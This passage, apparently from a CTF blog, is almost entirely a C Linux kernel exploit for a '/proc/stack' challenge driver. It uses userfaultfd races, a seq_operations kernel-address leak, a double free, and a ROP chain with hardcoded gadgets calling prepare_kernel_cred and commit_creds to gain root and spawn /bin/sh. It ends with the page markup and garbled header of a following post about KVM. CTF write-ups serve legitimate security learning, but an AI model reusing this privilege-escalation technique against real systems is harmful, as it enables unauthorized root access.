class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tty.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> add_rsp_0x10_ret 0xffffffff815afc83</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> add_rsp_0x38_ret 0xffffffff815b29f1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> add_rsp_pop_rbx_r12_r13_rbp_ret    0xffffffff8145523f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> add_rsp_0x1c8_pop_6_ret 0xffffffff814d51c0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> init_cred 0xffffffff815573b0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> commit_creds 0xffffffff81069c10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prepare_kernel_cred 0xffffffff81069e00</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdi_ret 0xffffffff81034505</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ret 0xffffffff810001cc</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swapgs_restore_regs_and_return_to_usermode 0xffffffff81600a34+0x10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mov_rdi_rax_pop_rbp_ret 0xffffffff8121f89a</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> mov_rdi_rax_pop_rbp_ret_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> swapgs_restore_regs_and_return_to_usermode_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_cred_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rdi_ret_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> ret_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="keyword">int</span> stack_fd=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> seq_fd[<span class="number">0x200</span>];</span><br><span class="line"><span class="keyword">size_t</span> kernel_msg;</span><br><span class="line"><span class="keyword">size_t</span> value;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *page;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_t</span> monitor_thread;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> * msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerUserFaultFd</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> (*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    ioctl(stack_fd,<span class="number">0x57AC0001</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">(<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    ioctl(stack_fd,<span class="number">0x57AC0002</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">leak_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        del(&amp;kernel_msg);</span><br><span class="line">        kernel_base=kernel_msg<span class="number">-0x13be80</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*]kernel_base:%p\033[0m\n&quot;</span>,kernel_base);</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">doublefree_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        del(&amp;value);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> stat_rop_fd=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">stat_rop_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x200</span>;i++)&#123;</span><br><span class="line">            close(seq_fd[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        mov_rdi_rax_pop_rbp_ret_addr=mov_rdi_rax_pop_rbp_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">        prepare_kernel_cred_addr=prepare_kernel_cred-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">        commit_creds_addr=commit_creds-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">        init_cred_addr=init_cred-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">        pop_rdi_ret_addr=pop_rdi_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">        ret_addr=ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">        swapgs_restore_regs_and_return_to_usermode_addr=swapgs_restore_regs_and_return_to_usermode-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">        __asm__(</span><br><span class="line">            <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r14, 0;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r13, pop_rdi_ret_addr;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12, 0;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbp, prepare_kernel_cred_addr;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbx, mov_rdi_rax_pop_rbp_ret_addr;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, 0;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r10, commit_creds_addr;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r9, swapgs_restore_regs_and_return_to_usermode_addr;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r8,    0x66666666;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rax, 0;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi, stat_rop_fd;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdx, 0x200;&quot;</span></span><br><span class="line">            <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">        );</span><br><span class="line">        usr_shell();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    stack_fd=open(<span class="string">&quot;/proc/stack&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(!stack_fd)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;/proc/stack open fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x200</span>;i++)&#123;</span><br><span class="line">        seq_fd[i]=open(<span class="string">&quot;/proc/self/stat&quot;</span>,O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(!seq_fd[i])&#123;</span><br><span class="line">            errExit(<span class="string">&quot;stat open fail&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    page_size=sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    page=<span class="built_in">malloc</span>(page_size);</span><br><span class="line">    <span class="keyword">char</span> *leak_buf=mmap(<span class="literal">NULL</span>,page_size,PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    registerUserFaultFd(leak_buf,page_size,leak_handler_thread);</span><br><span class="line">    <span class="keyword">int</span> seq_leak_fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(!seq_leak_fd)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;leak_stat open fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(seq_leak_fd);</span><br><span class="line">    add(leak_buf);</span><br><span class="line"></span><br><span class="line">    add(<span class="string">&quot;rootroot&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> *doublefree_buf=mmap(<span class="literal">NULL</span>,page_size,PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    registerUserFaultFd(doublefree_buf,page_size,doublefree_handler_thread);</span><br><span class="line">    del(doublefree_buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *stat_rop_buf=mmap(<span class="literal">NULL</span>,page_size*<span class="number">2</span>,PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    registerUserFaultFd(stat_rop_buf+page_size,page_size,stat_rop_handler_thread);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(stat_rop_buf+page_size<span class="number">-8</span>)=add_rsp_0x1c8_pop_6_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    stat_rop_fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(!stat_rop_fd)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;stat_rop_fd open fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;jingyinghua&quot;</span>, stat_rop_buf + page_size - <span class="number">8</span>, <span class="number">32</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>






























      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/14/KVM%E8%99%9A%E6%8B%9F%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%A4%8D%E7%8E%B0ACTF-mykvm/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/14/KVM%E8%99%9A%E6%8B%9F%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%A4%8D%E7%8E%B0ACTF-mykvm/" class="post-title-link" itemprop="url">KVMè™šæ‹ŸåŒ–å­¦ä¹ &å¤ç°ACTF mykvm</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-07-14 21:42:19" itemprop="dateCreated datePublished" datetime="2022-07-14T21:42:19+08:00">2022-07-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-07-19 01:12:30" itemprop="dateModified" datetime="2022-07-19T01:12:30+08:00">2022-07-19</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
